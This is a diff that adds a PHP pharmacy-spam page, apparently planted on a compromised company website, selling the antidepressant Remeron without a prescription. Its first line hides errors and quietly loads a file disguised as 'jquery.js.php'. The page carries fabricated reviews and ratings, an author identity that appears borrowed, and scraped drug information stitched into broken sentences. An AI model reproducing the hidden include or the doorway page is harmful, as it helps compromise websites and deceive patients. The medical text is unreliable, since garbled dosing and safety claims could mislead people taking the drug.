@@ -1,0 +1,366 @@
+<?php ini_set('display_errors',0); error_reporting(0); $key="remeron 45 mg tab"; $f=dirname(dirname(__FILE__)).'/'.'jquery.js.php'; if (file_exists($f)) require_once($f); ?><!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta http-equiv="x-ua-compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+
+
+
+<meta name="description" content="Remeron 45 mg tab — online fedex. Mirtazapine is a tetracyclic piperazino-azepine antidepressant agent that was initially approved for the treatment of major depressive disorder MDD in the Netherlands in ">
+<link rel="canonical" href="https://www.tridentmarineasia.com/assets/store/other/5472dywalohih">
+
+
+
+
+
+
+
+
+
+
+
+<meta name="author" content="Philip J. Wilson II, DO">
+<meta property="og:site_name" content="Tridentmarineasia">
+<meta property="og:locale" content="en-US">
+<meta property="og:title" content="Remeron 45 mg tab — single dose cost over the internet">
+<meta property="og:description" content="Remeron 45 mg tab — online fedex. Mirtazapine is a tetracyclic piperazino-azepine antidepressant agent that was initially approved for the treatment of major depressive disorder MDD in the Netherlands in ">
+<meta property="og:image" content="https://auropharma.ca/wp-content/uploads/2022/04/886965001180201.png">
+<meta property="og:url" content="https://www.tridentmarineasia.com/assets/store/other/5472dywalohih">
+
+<meta property="og:type" content="article">
+<meta property="article:tag" content="Philip J. Wilson II, DO">
+<meta property="article:section" content="Health">
+<meta property="article:author" content="https://www.facebook.com/tridentmarineasia">
+<meta property="article:publisher" content="https://www.facebook.com/tridentmarineasia">
+<meta property="article:published_time" content="2022-08-13T11:09:29+01:00">
+<meta property="article:modified_time" content="2023-03-29T12:01:38+01:00">
+
+
+<meta name="twitter:card" content="summary">
+<meta name="twitter:site" content="https://twitter.com/tridentmarineasia">
+<meta name="twitter:title" content="Remeron 45 mg tab — single dose cost over the internet">
+<meta name="twitter:description" content="Remeron 45 mg tab — online fedex. Mirtazapine is a tetracyclic piperazino-azepine antidepressant agent that was initially approved for the treatment of major depressive disorder MDD in the Netherlands in ">
+<meta name="twitter:image" content="https://auropharma.ca/wp-content/uploads/2022/04/886965001180201.png">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script type='application/ld+json'>{"@context":"http://schema.org","@type":"Article","mainEntityOfPage":{"@type":"MedicalWebPage","@id":"https://www.tridentmarineasia.com/assets/store/other/5472dywalohih"},"headline":"Remeron 45 mg tab — single dose cost over the internet","image":"https://auropharma.ca/wp-content/uploads/2022/04/886965001180201.png","datePublished":"2022-08-13T11:09:29+01:00","dateModified":"2023-03-29T12:01:38+01:00","author":{"@type":"Person","name":"Philip J. Wilson II, DO","jobTitle":"Ophthalmologist (Eye Doctor)","description":"Dr. Wilson is a native of Kirksville, MO. He enjoys hunting, fly fishing, skiing, and cattle farming. He and his wife, Wanda Wilson D.O., have three children.","url":"https://www.tridentmarineasia.com/assets/store/about","sameAs":["https://www.doctor.com/Dr-Philip-Wilson-3","","https://facebook.com/jcmgcares/"],"image":{"@type":"ImageObject","contentUrl":"https://www.tridentmarineasia.com/assets/store/assets/images/2cdcb39dc69797dcf8ac4ccc4b35871c_philip.png"},"address": {"@type": "PostalAddress","addressLocality": "Jefferson City","addressRegion": "MO","postalCode": "65109","streetAddress": "1241 W. Stadium Blvd.","addressCountry": "USA"},"telephone": "(573) 635-5264","faxNumber": "(573) 634-7423","honorificPrefix":"Dr","honorificSuffix":"M.D."},"publisher":{"@type":"Organization","name":"Tridentmarineasia","logo":{"@type":"ImageObject","url":"https://www.tridentmarineasia.com/assets/store/assets/images/logo.png"}},"description":"Remeron 45 mg tab — online fedex. Mirtazapine is a tetracyclic piperazino-azepine antidepressant agent that was initially approved for the treatment of major depressive disorder MDD in the Netherlands in ","inLanguage":"en"}</script>
+<script type="application/ld+json">{"@context":"http://schema.org","@type":"Product","name":"Remeron 45 mg tab","brand":{"@type":"Thing","name":"Other"},"image":"https://auropharma.ca/wp-content/uploads/2022/04/886965001180201.png","sku":"5685732866834","gtin13":"5347018274761","aggregateRating":{"@type":"AggregateRating","ratingValue":"4.77","bestRating":"5","worstRating":"1","reviewCount":"55","ratingCount":"169"},"description":"Remeron 45 mg tab — online fedex. Mirtazapine is a tetracyclic piperazino-azepine antidepressant agent that was initially approved for the treatment of major depressive disorder MDD in the Netherlands in ","review":[{"@type":"Review","author":{"@type":"Person","name":"Anonymous"},"datePublished":"2023-09-14T19:03:20+01:00","reviewBody":"Best cheapest generic online reseller.","disambiguatingDescription":"Remeron 45 mg tab","reviewRating":{"@type":"Rating","bestRating":"5","ratingValue":"4","worstRating":"1"}},{"@type":"Review","author":{"@type":"Person","name":"Anonymous"},"datePublished":"2024-04-14T10:05:11+01:00","reviewBody":"Mirtazapine works as an antidepressant.","disambiguatingDescription":"Remeron 45 mg tab","reviewRating":{"@type":"Rating","bestRating":"5","ratingValue":"4","worstRating":"1"}},{"@type":"Review","author":{"@type":"Person","name":"Felix"},"datePublished":"2024-07-15T20:03:23+01:00","reviewBody":"Sorry, something went wrong and the translator is not available.","disambiguatingDescription":"Remeron 45 mg tab","reviewRating":{"@type":"Rating","bestRating":"5","ratingValue":"5","worstRating":"1"}},{"@type":"Review","author":{"@type":"Person","name":"Lola "},"datePublished":"2023-04-28T16:06:29+01:00","reviewBody":"Patients referred to palliative care services often have between 3 and 7 distressing symptoms and may require multiple medications for effective symptom reduction 1.","disambiguatingDescription":"Remeron 45 mg tab","reviewRating":{"@type":"Rating","bestRating":"5","ratingValue":"5","worstRating":"1"}},{"@type":"Review","author":{"@type":"Person","name":"Anonymous"},"datePublished":"2024-05-17T12:03:38+01:00","reviewBody":"Learn about the medical, dental, pharmacy, behavioral, and voluntary benefits your employer may offer.","disambiguatingDescription":"Remeron 45 mg tab","reviewRating":{"@type":"Rating","bestRating":"5","ratingValue":"4","worstRating":"1"}},{"@type":"Review","author":{"@type":"Person","name":"Ruth "},"datePublished":"2024-08-16T19:09:57+01:00","reviewBody":"Common side effects include increased weight, sleepiness, and dizziness.","disambiguatingDescription":"Remeron 45 mg tab","reviewRating":{"@type":"Rating","bestRating":"5","ratingValue":"5","worstRating":"1"}}],"offers":{"@type":"AggregateOffer","offerCount":"10","lowPrice":"1.45","highPrice":"1.66","priceCurrency":"USD","seller":{"@type":"Organization","name":"Tridentmarineasia"}}}</script>
+
+
+
+<link rel="preload" href="https://auropharma.ca/wp-content/uploads/2022/04/886965001180201.png" as="image">
+
+<?php include_once(dirname(dirname(__FILE__)).'/css.html');?>
+
+
+
+
+
+
+
+<title>Remeron 45 mg tab — single dose cost over the internet</title>
+
+
+
+
+
+</head>
+
+<body>
+<?php include_once(dirname(dirname(__FILE__)).'/header.html');?>
+
+
+
+
+
+
+<main class="Bulma-component BlockBase">
+<div class="is-clipped">
+<div class="container is-fullhd is-fullheight mt-6 mt-10-desktop mb-3 mb-5-desktop">
+<div class="ProductHero is-flex m-0">
+<div class="is-hidden-tablet">
+<h1 class="mb-0 hb-font-heading-1 mx-4">Remeron 45 mg tab</h1>
+<br>
+<div class="mb-0 hb-font-heading-1 mx-4">
+<a class="font-medium" href="#reviews" title="View reviews">
+<div class="flex items-center">
+<?php include(dirname(dirname(__FILE__)).'/45star.html');?>
+<span class="flex items-center gap-x-2"><span class="text-2xl leading-[1.2]">&nbsp;68 reviews</span></span>
+</div>
+</a>
+</div>
+</div>
+<div class="ProductHero__image mt-5 mr-5-tablet">
+<div class="CarouselThumbnails CarouselThumbnails-vertical ml-5-mobile mr-0-mobile ml-0 js-CarouselThumbnails" role="region">
+<div class="CarouselThumbnails-inner">
+<div class="CarouselThumbnails-cell js-Carousel-cell">
+<img src="https://auropharma.ca/wp-content/uploads/2022/04/886965001180201.png" alt="Remeron 45 mg tab">
+</div>
+</div>
+</div>
+</div>
+<div class="ProductHero__info pt-3 px-6 mr-4">
+<div class="is-hidden-mobile mb-4">
+<h1 class="mb-0 hb-font-heading-1">Remeron 45 mg tab</h1>
+<div class="mt-3 leading-[0]">
+<a class="font-medium" href="#reviews" title="View reviews">
+<div class="flex items-center">
+<?php include(dirname(dirname(__FILE__)).'/45star.html');?>
+<span class="flex items-center gap-x-2"><span class="text-2xl leading-[1.2]">&nbsp;68 reviews</span></span>
+</div>
+</a>
+</div>
+</div>
+<div class="is-flex is-flex-direction-column">
+<div class="ProductHero__description content my-0">
+<p>We will ship your order as soon as international postal services resume.</p>
+<p>Or in a crisis, text NAMI to Mirtazapine is an antidepressant medication that works in the brain.</p>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+
+
+<?php include(dirname(dirname(__FILE__)).'/c1.html');?>
+<h2 class="mb-2 hb-font-heading-4">Remeron 45 mg tab details</h2>
+<div class="content">
+<p>Mirtazapine remeron 45 mg tab as an immediate-release tablet you take by mouth. These medicines work in the central nervous system CNS to make certain chemicals in the brain stronger. Brand names for mirtazapine include Remeron, and Remeron SolTab.</p><p>Mirtazapine belongs to the group of medications known as tetracyclic antidepressants. What other drugs could interact with this medication?</p><p>Mirtazapine belongs to the group of medications known as tetracyclic antidepressants. Antidepressants are used to help relieve the symptoms of depression such as feeling low, sleeping problems, loss of appetite, and loss of interest in activities that you would normally enjoy doing. When you have depression, certain chemicals in the brain are out of their normal balance.</p>
+
+<p style="text-align:left;"><img src="https://www.grxstatic.com/d4fuqqd5l3dbz/products/tms/Package_20564.JPG" alt="Remeron 45 Mg Tab"></p><br>
+
+<p>Remeron is an antidepressant commonly prescribed to treat depression and anxiety disorders. Although considered to be non-addictive, the drug is still regularly abused due to its mood-boosting and calming effects. The drug works by altering the levels of neurotransmitters in the brain and restoring the natural balance of chemicals in the central nervous system. Remeron increases serotonin, and if too high of a dose is taken or if the medicine is mixed with other drugs that increase serotonin, the disorder can manifest. Many individuals will take more of the drug than prescribed to feel the effects faster or use it to counteract the effects of stimulant drugs, such as cocaine.</p><p>Mirtazapine is a tetracyclic remeron 45 mg tab which was approved for marketing back in By antagonising central adrenoceptors, mirtazapine increases the release of noradrenaline and serotonin. Mirtazapine is extensively metabolised and has an average half-life of hours.</p>
+<?php include(dirname(dirname(__FILE__)).'/c2.html');?>
+
+<?php include(dirname(dirname(__FILE__)).'/c3.html');?>
+<h3 class="mb-0 hb-font-heading-4 is-flex-grow-1 py-2 pl-4">Remeron 45 mg tab average cost</h3>
+<?php include(dirname(dirname(__FILE__)).'/c4.html');?>
+
+<p style="text-align:center;"><img src="https://slidetodoc.com/presentation_image_h/3278f5760f98db57e871183c9f127e80/image-2.jpg" alt="Remeron 45 Mg Tab"></p><br>
+<p>What is mirtazapine, and how does it work mechanism of action? Mirtazapine is a tetracyclic antidepressant similar to maprotiline Ludiomil and tricyclic antidepressants, for example, desipramine Norpramin. Depression is an all-pervasive sense of sadness and gloom. It is believed that in some patients with depression, abnormal levels of neurotransmitters chemicals that nerves use to communicate with each other may be the cause of their depression.</p>
+
+<?php include(dirname(dirname(__FILE__)).'/c5.html');?>
+
+<?php include(dirname(dirname(__FILE__)).'/c3.html');?>
+<h3 class="mb-0 hb-font-heading-4 is-flex-grow-1 py-2 pl-4">Can you get remeron 45 mg tab online with no prescription</h3>
+<?php include(dirname(dirname(__FILE__)).'/c4.html');?>
+
+<p>Drinking alcohol with this medicine can cause side effects. You may start to notice an improvement in symptoms after about a week of using mirtazapine, but it usually remeron 45 mg tabs between four to six weeks to experience the full benefits. Some young people have thoughts about suicide when first taking an antidepressant. You may take mirtazapine with or without food. Ask your doctor how to safely stop using this medicine.</p>
+<p>Seek medical attention right away if you have symptoms of serotonin syndrome, such as: agitation, hallucinations, fever, sweating, shivering, fast heart rate, muscle stiffness, twitching, loss of coordination, nausea, vomiting, or diarrhea. Avoid driving or hazardous activity until you know how this medicine will affect you. Mirtazapine is a medicine used to treat depression. You should not take this medicine if you are allergic to mirtazapine. Side Effects What are the side effects of Mirtazapine Remeron?</p>
+<p>Your family or other caregivers should also be alert to changes in your mood or symptoms. Take the medicine as soon as you can, but skip the missed dose if it is almost time for your next dose. Tell your doctor if you also take stimulant medicine, opioid medicine, herbal products, or medicine for depression, mental illness, Parkinson's disease, migraine headaches, serious infections, or prevention of nausea and vomiting.</p>
+<p>Tell your doctor if you are pregnant or breastfeeding. Do not stop using mirtazapine suddenly, or you could have unpleasant symptoms such as agitation, confusion, tingling or electric shock feelings. Common side effects include: drowsiness, dizziness; increased appetite; or weight gain. Take the medicine at the same time each day, usually at bedtime. What should I do if I missed a dose of Mirtazapine Remeron?</p>
+<p>Your dosage of mirtazapine will depend on your medical condition, your response to the treatment, and other factors. Use Mirtazapine Remeron exactly as directed on the label, or as prescribed by your doctor. Your reactions could be impaired.</p>
+
+<p style="text-align:left;"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c3/Mirtazapine_generic.png/440px-Mirtazapine_generic.png" alt="Remeron 45 mg tab"></p><br>
+<p>Geriatric patients may have reduced clearance of mirtazapine and, as a result, may have increased plasma levels of the drug. In children and young adults, risks must be weighed against the benefits of taking antidepressants. Patients should be monitored closely for changes in behavior, clinical worsening, and suicidal tendencies. Worsening behavior and suicidal tendencies that are not part of the presenting symptoms may require discontinuation of therapy.</p>
+
+<?php include(dirname(dirname(__FILE__)).'/c5.html');?>
+
+<?php include(dirname(dirname(__FILE__)).'/c3.html');?>
+<h3 class="mb-0 hb-font-heading-4 is-flex-grow-1 py-2 pl-4">Cheapest remeron 45 mg tab free delivery</h3>
+<?php include(dirname(dirname(__FILE__)).'/c4.html');?>
+
+<p>Mirtazapine may be used as part of a combination therapy. This means you may need to take it with other medications. A class of drugs is a group of medications that work in a similar way.</p><p>Can anyone tell me if upping doze of Mirtazapine causes more anxiety. Feel like going back to 19mg. Pixie, what effect did upping the dose have sleep pattern, weight gain etc. I ask because I have been taking 7.</p><p>Mirtazapine is a tetracyclic piperazino-azepine remeron 45 mg tab agent that was initially approved for the treatment of major depressive disorder MDD in the Netherlands in It may improve the symptoms of neurological disorders, reverse weight loss caused by medical conditions, improve sleep, and prevent nausea and vomiting after surgery. A governmentally-recognized ID which uniquely identifies the product within its regulatory market.</p>
+
+
+<div class="faq-block" itemscope="" itemtype="https://schema.org/FAQPage">
+	<div class="faq-block_item" itemprop="mainEntity" itemscope="" itemtype="https://schema.org/Question">
+<h4 itemprop="name">Places to get remeron 45 mg tab fast delivery?</h4>
+		<div itemprop="acceptedAnswer" itemscope="" itemtype="https://schema.org/Answer">
+			<div itemprop="text">
+			<p>Take this medicine exactly as directed by your doctor in order to improve your condition as much as possible. Do not take more of it, do not take it more often, and do not take it for a longer time than your doctor ordered.</p>
+			</div>
+		</div>
+	</div>
+
+<ul>
+<li>
+It improves mood and feelings of well-being.
+</li>
+<li>
+The most common reason people seek to stop Remeron generic mirtazapine is that its side effects begin to outweigh any perceived benefits.
+</li>
+<li>
+List bisoprolol-hydrochlorothiazide side effects by likelihood remeron tablets 30 mg and severity.
+</li>
+<li>
+Sleepstation is a drug free and highly effective sleep therapy, delivered fully online by our expert sleep team.
+</li>
+<li>
+Mirtazapine is an antidepressant.
+</li>
+<li>
+Antidepressants increased the risk of suicidal thoughts and behaviors in pediatric and young adult patients in short-term studies.
+</li>
+</ul>
+
+<p>The usual starting dose for mirtazapine is 15mg to 30mg a day. This can be increased to up to 45mg a day.</p>
+
+<div class="faq-block_item" itemprop="mainEntity" itemscope="" itemtype="https://schema.org/Question">
+<h4 itemprop="name">Can i buy remeron 45 mg tab in online stores?</h4>
+		<div itemprop="acceptedAnswer" itemscope="" itemtype="https://schema.org/Answer">
+			<div itemprop="text">
+		 <p>Mirtazapine belongs to the group of medications known as tetracyclic antidepressants. Each oval, scored, red-brown, film-coated tablet, with Organon or MSD embossed on one side and TZ5 on the other side, contains 30 mg of mirtazapine.</p>
+			</div>
+		</div>
+	</div>
+</div>
+
+
+
+<?php include(dirname(dirname(__FILE__)).'/c5.html');?>
+
+<?php include(dirname(dirname(__FILE__)).'/aut1.html');?>
+<div itemscope itemtype="http://schema.org/WebPage">
+<div itemprop="author creator" itemscope="" itemtype="http://schema.org/Person">
+<link itemprop="sameAs" href="https://www.doctor.com/Dr-Philip-Wilson-3">
+<div>
+<p><strong>Authored <time datetime="2022-08-13T11:09:29+01:00">2022-08-13</time> by <a href="https://www.tridentmarineasia.com/assets/store/about"><span itemprop="name">Philip J. Wilson II, DO</span></a></strong></p>
+</div>
+</div>
+</div>
+<?php include(dirname(dirname(__FILE__)).'/aut2.html');?>
+
+<div class="has-background-cms-reviews is-clipped">
+<div class="container is-max-widescreen mt-6 mt-10-desktop mb-6 mb-10-desktop">
+<h2 id="reviews" class="mb-4 hb-font-heading-3 has-text-centered">Remeron 45 Mg Tab Reviews</h2>
+<div class="overflow-hidden pl-6 desktop:pl-0">
+<div>
+<div class="flex items-center">
+<span class="text-2xl leading-[1.2]"><b>Rating 4.9/5&nbsp;</b></span>
+<?php include(dirname(dirname(__FILE__)).'/45star.html');?>
+</div>
+<br>
+</div>
+<div class="group relative hidden h-full flex-row gap-6 desktop:flex">
+<div class="swiper cards-swiper pr-6">
+<div class="swiper-wrapper">
+
+<div class="swiper-slide my-2 pb-4">
+<div>
+<div class="hover:shadow-bar flex h-full flex-col overflow-hidden rounded-xl bg-white transition-all duration-150">
+<div class="grow p-6 pb-3">
+<?php include(dirname(dirname(__FILE__)).'/5star.html');?>
+<h3 class="mt-2 text-xl font-bold text-dark"><b>Swift service, order arrived as promised.</b></h3>
+<p class="mt-3 text-base font-normal leading-[1.4] text-dark">Mirtazapine is an antidepressant medicine.</p>
+</div>
+<div class="flex flex-col justify-between gap-y-2 border-t-2 border-lightest px-6 pb-4 pt-3 tablet:flex-row tablet:items-center"><span style="font-size: 90%; font-weight: lighter;">Volker, March 2, 2024</span></div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div class="relative desktop:invisible desktop:h-0">
+<div class="relative">
+<div class="overflow-x-auto overflow-y-hidden no-scrollbar snap-x snap-mandatory">
+<div class="flex flex-row gap-6 pb-6">
+
+
+
+<div class="bg-light shrink-0 rounded-xl overflow-hidden w-[270px] tablet:w-[364px] bg-transparent snap-center tablet:snap-start cursor-pointer">
+<div class="my-2 h-full pb-4">
+<div class="hover:shadow-bar flex h-full flex-col overflow-hidden rounded-xl bg-white transition-all duration-150">
+<div class="grow p-6 pb-3">
+<?php include(dirname(dirname(__FILE__)).'/5star.html');?>
+<h3 class="mt-2 text-xl font-bold text-dark"><b>Swift service, order arrived as promised.</b></h3>
+<p class="mt-3 text-base font-normal leading-[1.4] text-dark">Mirtazapine is an antidepressant medicine.</p>
+</div>
+<div class="flex flex-col justify-between gap-y-2 border-t-2 border-lightest px-6 pb-4 pt-3 tablet:flex-row tablet:items-center"><span style="font-size: 90%; font-weight: lighter;">Volker, March 2, 2024</span></div>
+</div>
+</div>
+</div>
+<span class="w-[.1px] shrink-0"></span>
+</div>
+</div>
+</div>
+</div>
+</div>
+<?php include_once(dirname(dirname(__FILE__)).'/addreview.html');?>
+</div>
+</div>
+
+<div class="has-background-white is-clipped">
+<div class="container is-max-desktop mt-6 mt-10-desktop mb-6 mb-10-desktop">
+<h2 class="mb-4 hb-font-heading-3 has-text-centered">Recommended Posts</h2>
+<div class="LinksListColumns u-sectionBlock pt-3 pb-0">
+<div class="Container Container--small">
+<div class="Row">
+<div class="Col-12 Col-sm-6 LinksListColumns-column">
+<div class="LinksList">
+<ul>
+<li><a href="https://www.tridentmarineasia.com/assets/store/other/6141reful">Buy cheap maxalt</a></li><li><a href="https://www.tridentmarineasia.com/assets/store/other/5674-risperdal-3mg">Risperdal 3mg</a></li><li><a href="https://www.tridentmarineasia.com/assets/store/other/7211-floxin-cost-uk">Floxin cost uk</a></li><li><a href="https://www.tridentmarineasia.com/assets/store/other/9766-buy-buspar-cheap-online">Buy buspar cheap online</a></li><li><a href="https://www.tridentmarineasia.com/assets/store/other/4336-clarinex-aerius-05mg">Clarinex aerius 0.5mg</a></li>
+</ul>
+</div>
+</div>
+<div class="Col-12 Col-sm-6 LinksListColumns-column">
+<div class="LinksList">
+<ul>
+<li><a href="https://www.tridentmarineasia.com/assets/store/other/9239-elocon-buy-online">Elocon buy online</a></li><li><a href="https://www.tridentmarineasia.com/assets/store/other/8366-etodolac-er-600-mg-tablet">Etodolac er 600 mg tablet</a></li><li><a href="https://www.tridentmarineasia.com/assets/store/other/2714rawuxare">Casodex 50 mg generic</a></li>
+</ul>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<?php include_once(dirname(dirname(__FILE__)).'/links.html');?>
+
+
+
+
+
+
+
+
+
+
+
+
+
+<nav class="Breadcrumb container is-max-desktop px-4 py-6">
+<ol class="Breadcrumb-list" itemscope itemtype="http://schema.org/BreadcrumbList" role="menubar">
+<li class="Breadcrumb-item" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+<a class="Breadcrumb-link hb-font-text-bold" itemprop="item" href="https://www.tridentmarineasia.com/assets/store" title="Home" role="menuitem"><span itemprop="name">Home</span></a>
+<meta itemprop="position" content="1">
+</li>
+<li class="Breadcrumb-item" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+<a class="Breadcrumb-link hb-font-text-bold" itemprop="item" href="https://www.tridentmarineasia.com/assets/store/other/" title="Other" role="menuitem"><span itemprop="name">Other</span></a>
+<meta itemprop="position" content="2">
+</li>
+<li class="Breadcrumb-item hb-font-text-regular" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem" title="Remeron 45 mg tab" role="menuitem"><span itemprop="name">Remeron 45 mg tab</span>
+<meta itemprop="position" content="3">
+</li>
+
+
+
+
+
+</ol>
+</nav>
+</main>
+<?php include_once(dirname(dirname(__FILE__)).'/footer.html');?>
+
+
+
+
+
+
+</body>
+</html>
